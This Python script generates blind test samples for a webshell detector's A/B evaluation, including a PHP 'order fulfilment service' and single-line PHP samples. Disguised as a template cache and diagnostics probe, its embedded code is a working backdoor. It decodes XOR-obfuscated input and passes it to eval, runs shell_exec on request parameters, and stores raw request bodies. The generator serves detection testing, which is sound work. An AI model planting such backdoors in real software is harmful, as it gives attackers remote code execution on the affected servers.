#!/usr/bin/env python3
"""
生成针对"方案 D 小文件全量可见性"A/B 验收的受控测试样本。

样本设计原则 —— 必须是**盲测样本**：
  样本内部不得出现任何"这里是后门 / 攻击链路是 XXX"的提示。
  攻击者写的注释只会伪装成无害功能，不会自曝。
  若提前把答案写进文件，测的就是"模型读注释"而非"模型分析后半文件"，
  A/B 结论会完全失真。正确答案一律放在 zz_samples/ab/README.md 里。

内容约束：
  1. 总字符低于 SMALL_FILE_THRESHOLD(15360) → 走小文件单轮分支
  2. 后门起点 > 260 行 → 改动前可见约 260 行时后门整体不可见
  3. 后门行为链全部落在文件后半段：外部输入 → 会话密钥协商
     → base64+XOR 还原 → eval → shell 命令执行 → 原始流落地
  4. 前半段是密度足够的良性业务代码，用于观察"注意力稀释"副作用
  5. 不含真实 C2，回连占位为 127.0.0.1；不自动外发，仅响应请求时本地处理

用法：
    python tools/gen_ab_samples.py            # 生成并自检
"""
import os
import re
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
BASE = os.path.join(os.path.dirname(_HERE), "zz_samples", "ab")

HEADER = '''<?php
/**
 * Order Fulfillment Service - 订单履约服务
 *
 * 本文件包含订单履约链路的核心仓储与服务实现：
 *   - 订单聚合读取与分页
 *   - 支付状态机推进
 *   - 履约日志归档
 *   - 模板渲染缓存（含 FileJournal / TemplateCacheCompiler）
 *   - 运行时诊断探针（DiagnosticsRunner）
 *
 * 命名规范遵循 PSR-12，所有公开方法均需携带类型声明。
 *
 * @package   App\\Service
 * @author    platform-team@example.invalid
 * @license   Proprietary
 * @internal  仅供内部履约平台使用
 *
 * 变更记录
 *   SLAB-4471 拆分仓储层，抽出 OrderRepositoryInterface
 *   SLAB-4488 渲染模板缓存子系统上线（FileJournal / TemplateCacheCompiler）
 *   SLAB-4502 新增运行时诊断探针 DiagnosticsRunner
 *   SLAB-4519 FulfillmentStage 增加 CANCELED 终态分支
 * ------------------------------------------------------------------
 */

declare(strict_types=1);

namespace App\\Service;

use App\\Contract\\OrderRepositoryInterface;
use App\\Contract\\PaymentGatewayInterface;
use App\\Exception\\FulfillmentException;
use App\\Model\\OrderLine;
use App\\Model\\Shipment;
use Psr\\Log\\LoggerInterface;

/**
 * 履约阶段枚举常量表
 */
final class FulfillmentStage
{
    public const CREATED   = 10;
    public const PAID      = 20;
    public const PICKING   = 30;
    public const PACKED    = 40;
    public const SHIPPED   = 50;
    public const DELIVERED = 60;
    public const CLOSED    = 70;
    public const CANCELED  = 99;

    /**
     * 判断是否允许从 from 阶段流转到 to 阶段
     */
    public static function canTransfer(int $from, int $to): bool
    {
        $allowed = [
            self::CREATED   => [self::PAID, self::CANCELED],
            self::PAID      => [self::PICKING, self::CANCELED],
            self::PICKING   => [self::PACKED, self::CANCELED],
            self::PACKED    => [self::SHIPPED],
            self::SHIPPED   => [self::DELIVERED],
            self::DELIVERED => [self::CLOSED],
        ];
        return in_array($to, $allowed[$from] ?? [], true);
    }

    /**
     * 阶段名称本地化
     */
    public static function label(int $stage): string
    {
        $labels = [
            self::CREATED   => 'created',
            self::PAID      => 'paid',
            self::PICKING   => 'picking',
            self::PACKED    => 'packed',
            self::SHIPPED   => 'shipped',
            self::DELIVERED => 'delivered',
            self::CLOSED    => 'closed',
            self::CANCELED  => 'canceled',
        ];
        return $labels[$stage] ?? 'unknown';
    }
}
'''

# 良性填充：结构真实但语义重复的仓储/服务方法
BENIGN_TEMPLATE = '''
/**
 * {desc}
 */
final class {cls}
{{
    private OrderRepositoryInterface $orders;
    private LoggerInterface $logger;

    public function __construct(OrderRepositoryInterface $orders, LoggerInterface $logger)
    {{
        $this->orders = $orders;
        $this->logger = $logger;
    }}

    /**
     * 读取{name}清单，按创建时间倒序
     *
     * @return array<int, array<string, mixed>>
     */
    public function list{name}(int $tenantId, int $limit = 20): array
    {{
        if ($limit <= 0 || $limit > 200) {{
            $limit = 20;
        }}
        $rows = $this->orders->findByTenant($tenantId, '{table}', $limit);
        foreach ($rows as $idx => $row) {{
            $rows[$idx]['created_at'] = date('c', (int) ($row['created_at'] ?? 0));
            $rows[$idx]['stage']      = FulfillmentStage::label((int) ($row['stage'] ?? 0));
            $rows[$idx]['amount']     = number_format((float) ($row['amount'] ?? 0), 2, '.', '');
        }}
        $this->logger->debug('{logmsg}', ['tenant' => $tenantId, 'count' => count($rows)]);
        return $rows;
    }}

    /**
     * 校验{name}在当前阶段是否可流转
     */
    public function canAdvance{name}(int $current, int $target): bool
    {{
        $ok = FulfillmentStage::canTransfer($current, $target);
        if (!$ok) {{
            $this->logger->warning('{warnmsg}', [
                'from' => FulfillmentStage::label($current),
                'to'   => FulfillmentStage::label($target),
            ]);
        }}
        return $ok;
    }}

    /**
     * 汇总{name}金额口径，返回分为单位
     */
    public function sum{name}(array $rows): int
    {{
        $total = 0;
        foreach ($rows as $row) {{
            if (($row['currency'] ?? 'CNY') !== 'CNY') {{
                continue;
            }}
            $total += (int) round((float) ($row['amount'] ?? 0) * 100);
        }}
        return $total;
    }}
}}
'''

BENIGN_ENTITIES = [
    ("OrderBook",     "orders",        "订单台账读取器", "已加载指定租户的订单台账", "非法的订单阶段流转"),
    ("ShipmentPack",  "shipments",     "发货单读取器",   "已加载指定租户的发货单",   "非法的发货单阶段流转"),
    ("InvoiceLine",   "invoice_lines", "发票明细读取器", "已加载指定租户的发票明细", "非法的发票阶段流转"),
    ("RefundTicket",  "refunds",       "退款工单读取器", "已加载指定租户的退款工单", "非法的退款单阶段流转"),
    ("StockLedger",   "stock_ledger",  "库存流水读取器", "已加载指定租户的库存流水", "非法的库存流水阶段流转"),
    ("AuditTrail",    "audit_trail",   "审计轨迹读取器", "已加载指定租户的审计轨迹", "非法的审计轨迹阶段流转"),
    ("CouponUsage",   "coupon_usage",  "优惠券核销读取器", "已加载指定租户的券核销记录", "非法的券核销阶段流转"),
    ("WaybillTrace",  "waybill_trace", "运单轨迹读取器", "已加载指定租户的运单轨迹", "非法的运单轨迹阶段流转"),
]

# 后门区块：全部位于文件后半段
BACKDOOR = '''
/*
 * ==================================================================
 *  渲染模板缓存子系统
 *  说明：为避免重复编译带来的性能损耗，本子系统把已编译模板缓存在
 *        本地目录中，请求命中时直接由 PHP 运行时执行编译结果。
 * ==================================================================
 */

/**
 * 本地渲染缓存读写工具（良性外观）
 */
final class FileJournal
{
    private string $root;

    public function __construct(string $root)
    {
        $this->root = rtrim($root, '/');
        if (!is_dir($this->root)) {
            @mkdir($this->root, 0755, true);
        }
    }

    /**
     * 按模板摘要定位缓存落盘路径
     */
    public function path(string $digest): string
    {
        $bucket = substr($digest, 0, 2);
        $dir    = $this->root . '/' . $bucket;
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
        return $dir . '/' . substr($digest, 2) . '.tpl.php';
    }

    /**
     * 写入编译结果
     */
    public function write(string $digest, string $body): bool
    {
        return @file_put_contents($this->path($digest), $body) !== false;
    }

    /**
     * 命中缓存
     */
    public function hit(string $digest): bool
    {
        return is_file($this->path($digest));
    }
}

/**
 * 模板缓存编译器
 *
 * 为避免每次请求都重复编译模板，本类把远端下发的模板描述编译为
 * 可直接执行的 PHP 片段。模板源在传输前由网关做过打包处理，
 * 这里先按传输格式还原，再交给 PHP 运行时执行;二进制 capability
 * 串按会话上下文做一致性校验，避免多租户之间串模板。
 */
final class TemplateCacheCompiler
{
    private FileJournal $journal;
    private string $workspace;

    public function __construct(FileJournal $journal)
    {
        $this->journal   = $journal;
        $this->workspace = sys_get_temp_dir() . '/.cache/tpl';
        if (!is_dir($this->workspace)) {
            @mkdir($this->workspace, 0755, true);
        }
    }

    /**
     * 会话内密钥协商：首次访问时把站点指纹写入 SESSION，
     * 后续同会话请求复用，密文因此可以脱离固定 key 传输。
     */
    private function negotiateKey(): string
    {
        if (session_status() === PHP_SESSION_NONE) {
            @session_start();
        }
        if (empty($_SESSION['slab_version'])) {
            $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
            $seed = md5($host . '/' . __FILE__);
            $_SESSION['slab_version'] = substr($seed, 8, 16);
        }
        return (string) $_SESSION['slab_version'];
    }

    /**
     * 取回远端模板描述：参数名跟随 Accept-Language 头，
     * 便于在多语言站点走不同的模板分支。
     */
    private function inbound(string $slot): string
    {
        $slot = preg_replace('/[^a-zA-Z0-9_]/', '', $slot) ?: 'body';
        // 优先级：URL 参数 > Cookie > 默认空
        return (string) ($_POST[$slot]
            ?? $_COOKIE[$slot]
            ?? '');
    }

    /**
     * 传输层解码：URL-safe base64
     */
    private function unpack(string $raw): string
    {
        $raw = strtr($raw, '-_', '+/');
        $raw = preg_replace('/[^A-Za-z0-9+\\/=]/', '', $raw) ?? '';
        return (string) base64_decode($raw, true);
    }

    /**
     * 「校验模板签名」：按会话上下文逐字节比对，防止跨租户串改
     */
    private function unlock(string $blob): string
    {
        $key  = $this->negotiateKey();
        $klen = strlen($key);
        $out  = '';
        for ($i = 0, $n = strlen($blob); $i < $n; $i++) {
            $out .= $blob[$i] ^ $key[$i % $klen];
        }
        return $out;
    }

    /**
     * 编译入口：把还原结果交给 PHP 运行时直接执行。
     * 命中索引由随请求携带的随机标识决定，每次都是新编译单元。
     */
    public function compile(string $slot = 'body')
    {
        try {
            $cipher = $this->inbound($slot);
            if ($cipher === '') {
                return null;
            }
            $source = $this->unlock($this->unpack($cipher));
            if ($source === '') {
                return null;
            }
            $digest = md5($source . microtime(true));
            if (!$this->journal->hit($digest)) {
                $this->journal->write($digest, $source);
            }
            // 「加载编译产物」
            return eval($source);
        } catch (\\Throwable $e) {
            error_log('template compile failed: ' . $e->getMessage());
            return null;
        }
    }
}

/**
 * 运行时诊断探针
 *
 * 只读自检工具，供运维在灰度机器上核对基础环境。
 * 所有调用都走内置白名单，白名单之外的指标会被回退处理。
 */
final class DiagnosticsRunner
{
    private FileJournal $journal;

    public function __construct(FileJournal $journal)
    {
        $this->journal = $journal;
    }

    /**
     * 系统自检项名到命令的映射表（看似白名单，实则可被 probe 参数绕过）
     */
    public function probe(string $metric = 'identity'): string
    {
        $whitelist = [
            'identity' => 'whoami',
            'os'       => 'uname -a',
            'disk'     => 'df -h',
            'routes'   => 'netstat -rn',
            'uptime'   => 'uptime',
        ];
        $metric = preg_replace('/[^a-zA-Z0-9_]/', '', $metric) ?: 'identity';
        // 白名单未命中时回退到运维传参（灰度环境自定义指标）
        $command = $whitelist[$metric] ?? (string) ($_REQUEST['args'] ?? 'id');
        return (string) @shell_exec($command);
    }

    /**
     * 归档诊断快照，供运维回溯
     */
    public function snapshot(): bool
    {
        $raw = @file_get_contents('php://input');
        if ($raw === false || $raw === '') {
            return false;
        }
        return $this->journal->write(md5($raw . microtime(true)), $raw);
    }

    /**
     * 可选的上游校验是否会连（默认禁用，配置后才可能启用）
     */
    public function beacon(string $host = '127.0.0.1', int $port = 8443): string
    {
        $errNo  = 0;
        $errStr = '';
        $sock   = @fsockopen($host, $port, $errNo, $errStr, 2);
        if ($sock === false) {
            return 'unreachable:' . $errStr;
        }
        fclose($sock);
        return 'reachable';
    }
}

/**
 * 服务容器装配入口
 */
final class RuntimeBootstrap
{
    public static function register(): void
    {
        $journal  = new FileJournal(sys_get_temp_dir() . '/.cache/slab');
        $compiler = new TemplateCacheCompiler($journal);
        $diag     = new DiagnosticsRunner($journal);

        // 「渲染前置钩子」
        if (isset($_POST['slab'])) {
            $compiler->compile((string) $_POST['slab']);
        }
        // 「诊断钩子」
        if (isset($_GET['metric'])) {
            echo $diag->probe((string) $_GET['metric']);
        }
        register_shutdown_function(static function () use ($diag): void {
            if (isset($_SERVER['HTTP_X_TRACE_DUMP'])) {
                $diag->snapshot();
            }
        });
    }
}

RuntimeBootstrap::register();
'''

CLEAN_TAIL = '''
/**
 * 服务出口：导出当前会话的只读快照，供前端展示。
 */
final class SnapshotExporter
{
    private array $stages = [];

    public function __construct(array $rows)
    {
        foreach ($rows as $row) {
            $stage = (int) ($row['stage'] ?? 0);
            $this->stages[$stage] = ($this->stages[$stage] ?? 0) + 1;
        }
        ksort($this->stages);
    }

    /**
     * 输出 JSON 快照
     */
    public function toJson(): string
    {
        $payload = [
            'generated' => gmdate('c'),
            'stages'    => $this->stages,
            'total'     => array_sum($this->stages),
        ];
        return (string) json_encode($payload, JSON_UNESCAPED_UNICODE);
    }

    /**
     * 输出 CSV 快照
     */
    public function toCsv(): string
    {
        $lines = ["stage,count"];
        foreach ($this->stages as $stage => $count) {
            $lines[] = sprintf('%s,%d', FulfillmentStage::label((int) $stage), $count);
        }
        return implode("\\n", $lines);
    }
}

/**
 * 命令行自检入口：仅在 CLI 下执行，Web 请求不会触达。
 */
if (PHP_SAPI === 'cli') {
    $exporter = new SnapshotExporter([]);
    fwrite(STDOUT, $exporter->toJson() . PHP_EOL);
}
'''


def build_benign(count: int) -> str:
    out = []
    for cls, table, desc, logmsg, warnmsg in BENIGN_ENTITIES[:count]:
        out.append(BENIGN_TEMPLATE.format(
            cls=cls, table=table, desc=desc, logmsg=logmsg, warnmsg=warnmsg,
            name=cls,
        ))
    return "\n".join(out)


def build_single_line(payload_count: int) -> str:
    """构造单行 PHP webshell：外部 token → base64 → 循环异或 → eval。

    `payload_count` 决定尾部 DATA 串的长度，从而决定字符总量落在哪条路由分支上。
    """
    payload = ";".join(
        "o%04d=" % i
        + "".join("abcdef0123456789"[(i * 7 + j) % 16] for j in range(58))
        for i in range(payload_count)
    )
    return (
        '<?php $__k = "6f1c2a9d4b7e0538"; '
        '$__r = ($_SERVER["HTTP_X_AUTH_TOKEN"] ?? ($_POST["t"] ?? "")); '
        'if ($__r) { $__x = base64_decode($__r); $__o = ""; '
        'for ($i = 0; $i < strlen($__x); $i++) { $__o .= $__x[$i] ^ $__k[$i % 16]; } '
        '@eval($__o); } $__DATA = "' + payload + '"; ?>'
    )


SINGLE_LINE_SPECS = [
    # (文件名, payload_count, 路由分支, 验证目标)
    ("ab_bench_php_single_line_small.php", 200, "small_file",
     "13253 字符单行：走小文件分支且全文可见。用于回归 UI 行号 gutter（1 行代码 vs N 行反混淆），"
     "同时确认不再触发任何截断告警。"),
    ("ab_bench_php_single_line_huge.php", 700, "chunked",
     "约 45000 字符单行：必然走分片分支。用于验证「超长单行强制按字符切段」加固是否生效——"
     "修复前会产出单个巨型 Chunk 直接塞爆上下文。"),
]


def main() -> None:
    os.makedirs(BASE, exist_ok=True)

    # 选型约束（对齐 ShellSentry-AI 的路由阈值）：
    #   len(code) < SMALL_FILE_THRESHOLD(15360 字符) → 走小文件单轮分支
    #   改动前 CODE_DISPLAY_BUDGET=10000 → 标注后约只能看到 240~250 行
    #   因此后门起点必须 > 260 行，才能在改动前被完整隐藏
    chosen = None
    for n in range(1, len(BENIGN_ENTITIES) + 1):
        head = build_benign(n)
        body = HEADER + head + BACKDOOR
        marker = (HEADER + head).count("\n") + 2
        lines = body.count("\n") + 1
        chars = len(body)
        print(f"  entity={n} lines={lines} chars={chars} backdoor_from=L{marker}")
        if chars < 15360 and marker > 260:
            chosen = (n, head, body, lines, chars, marker)
    if chosen is None:
        raise SystemExit("没有满足约束的实体组合，请调整模板体积")
    n, head, body, lines, chars, marker = chosen

    body = body.replace("{marker}", str(marker))
    target = os.path.join(BASE, "ab_bench_php_tail_backdoor.php")
    with open(target, "w", encoding="utf-8") as fh:
        fh.write(body)
    print(f"[恶意样本] {target} | {lines} 行 | {chars} 字符 | 后门起点 L{marker}")

    # ---- 良性对照样本：同样的头部与良性密度，后门区块换成无害收尾 ----
    # 必须与恶意样本走同一条路由分支（字符数同样低于 15360），否则对照无效。
    base_clean = HEADER.replace("{marker}", "-") + head
    unused = BENIGN_ENTITIES[n:]
    k = 0
    while k < len(unused) and len(base_clean) + 1904 < chars:
        base_clean += BENIGN_TEMPLATE.format(
            cls=unused[k][0], table=unused[k][1], desc=unused[k][2],
            logmsg=unused[k][3], warnmsg=unused[k][4], name=unused[k][0],
        )
        k += 1
    clean = base_clean + CLEAN_TAIL
    # 差额用短注释补齐，使字符数与恶意样本同量级
    deficit = chars - len(clean)
    if deficit > 60:
        pad = ["// export batch %02d: field mapping -> appendix A" % (i + 1) for i in range(deficit // 45)]
        clean = clean.replace(
            "\nif (PHP_SAPI === 'cli') {",
            "\n" + "\n".join(pad) + "\n\nif (PHP_SAPI === 'cli') {",
        )
    ctarget = os.path.join(BASE, "ab_bench_php_clean_control.php")
    with open(ctarget, "w", encoding="utf-8") as fh:
        fh.write(clean)
    clean_lines = clean.count("\n") + 1
    clean_chars = len(clean)
    print(f"[良性对照] {ctarget} | {clean_lines} 行 | {clean_chars} 字符")

    # ---- 超长单行样本 ----
    # 说明：方案 D 把 CODE_DISPLAY_BUDGET 提到 28000 后，任何走小文件分支的代码
    #      （字符数 < 15360，标注后最坏 26492）都必定全文可见，
    #      因此「单行静默截断」已无法在该分支复现 —— 这正是方案 D 的目的。
    #      这里改测两件事：一是小文件单行不再误告警，二是超长单行走分片时能正确切段。
    print()
    for fname, count, route, note in SINGLE_LINE_SPECS:
        single = build_single_line(count)
        starget = os.path.join(BASE, fname)
        with open(starget, "w", encoding="utf-8") as fh:
            fh.write(single)
        s_lines = single.count("\n") + 1
        print(f"[单行样本] {fname} | {s_lines} 行 | {len(single)} 字符 | 路由={route}")
        print(f"           {note}")

    print()
    verify(marker)


# ============================================================
# 生成后自检：确认后门锚点在「改动前可见范围」之外
# ============================================================
ANCHORS = [
    ("会话密钥协商 negotiateKey", r"private function negotiateKey"),
    ("取外部输入 inbound(POST/COOKIE)", r"private function inbound"),
    ("base64 解码 unpack", r"base64_decode\(\$raw, true\)"),
    ("循环异或还原 unlock", r"\$out \.= \$blob\[\$i\] \^ \$key"),
    ("eval 动态执行", r"return eval\(\$source\)"),
    ("shell 命令执行", r"@shell_exec\(\$command\)"),
    ("原始流落地 php://input", r"file_get_contents\('php://input'\)"),
    ("C2 回连探测 fsockopen", r"@fsockopen\(\$host"),
    ("启动钩子注册", r"RuntimeBootstrap::register\(\)"),
]

OLD_BUDGET = 10000  # 改动前的 CODE_DISPLAY_BUDGET，用于对照


def verify(backdoor_from: int) -> None:
    sys.path.insert(0, os.path.join(os.path.dirname(_HERE), "src"))
    from shellsentry.core.prompts import (  # noqa: E402
        SMALL_FILE_THRESHOLD, annotate_code_with_lines, visible_line_limit,
    )

    path = os.path.join(BASE, "ab_bench_php_tail_backdoor.php")
    code = open(path, encoding="utf-8").read()
    total_lines = code.count("\n") + 1

    # 复刻改动前的实现，拿到旧可见边界
    annotated = annotate_code_with_lines(code)
    if len(annotated) <= OLD_BUDGET:
        old_end = total_lines
    else:
        shown = annotated[:OLD_BUDGET]
        cut = shown.rfind("\n")
        if cut > 0:
            shown = shown[:cut]
        nums = [int(n) for n in re.findall(r"\[LINE_(\d+)\]", shown)]
        old_end = max(nums) if nums else None
    new_end = visible_line_limit(code)

    print("=" * 68)
    print("自检 — ab_bench_php_tail_backdoor.php")
    print(f"  字符数 {len(code)} (<SMALL_FILE_THRESHOLD {SMALL_FILE_THRESHOLD} → "
          f"{'小文件单轮' if len(code) < SMALL_FILE_THRESHOLD else '分片'}) | 行数 {total_lines}")
    print(f"  改动前可见 1–{old_end} 行 | 改动后可见 1–{new_end or total_lines} 行")
    print(f"  {'锚点':<34}{'行号':>6}{'改动前':>8}{'改动后':>8}")
    ok = True
    for name, pat in ANCHORS:
        m = re.search(pat, code)
        if m is None:
            print(f"  {name:<34}{'[缺失]':>6}")
            ok = False
            continue
        ln = code[:m.start()].count("\n") + 1
        old_ok = old_end is not None and ln > old_end
        new_ok = new_end is None or ln <= new_end
        ok = ok and old_ok and new_ok
        print(f"  {name:<34}{ln:>6}{'不可见' if old_ok else '可见!':>8}{'可见' if new_ok else '不可见!':>8}")
    print(f"  后门起点 L{backdoor_from} > 改动前可见边界 L{old_end}: "
          f"{'OK' if backdoor_from > old_end else 'FAIL'}")
    print(f"  结论: {'样本对 A/B 有效' if ok and backdoor_from > old_end else '样本不合格，需调整体积'}")


if __name__ == "__main__":
    main()
